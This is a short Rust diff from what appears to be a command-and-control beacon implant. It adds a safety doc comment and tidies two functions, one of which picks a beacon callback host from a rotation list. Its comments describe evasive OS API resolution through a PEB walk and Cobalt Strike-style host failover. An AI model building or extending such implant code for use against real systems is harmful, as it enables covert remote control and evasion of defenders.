@@ -270,6 +270,10 @@ impl ChannelCtx {
 ///
 /// Channels not yet implemented (spec-2~6) return `None` and leave a
 /// diagnostic marker via `diag::diag_mark()`.
+///
+/// # Safety
+/// Dispatches to the active channel's `send_recv`, which resolves and invokes
+/// OS API function pointers via PEB walk; `frame` must be a valid buffer.
 pub unsafe fn dispatch_send_recv(
     ctx: &ChannelCtx,
     active: Channel,
@@ -334,12 +338,12 @@ static ROTATION_IDX: core::sync::atomic::AtomicUsize = core::sync::atomic::Atomi
 /// slice into the rotation list at the current index WITHOUT advancing it —
 /// the beacon holds on this host until a call fails, at which point the
 /// caller invokes [`advance_rotation_host`] to skip it (CS 4.10 fail-hold).
-pub fn select_rotation_host<'a>(rotation_hosts: &'a str) -> Option<&'a [u8]> {
+pub fn select_rotation_host(rotation_hosts: &str) -> Option<&[u8]> {
     if rotation_hosts.is_empty() {
         return None;
     }
     let hosts: Vec<&str> = rotation_hosts
-        .split(|c| c == ',' || c == ' ')
+        .split([',', ' '])
         .filter(|s| !s.is_empty())
         .collect();
     if hosts.is_empty() {
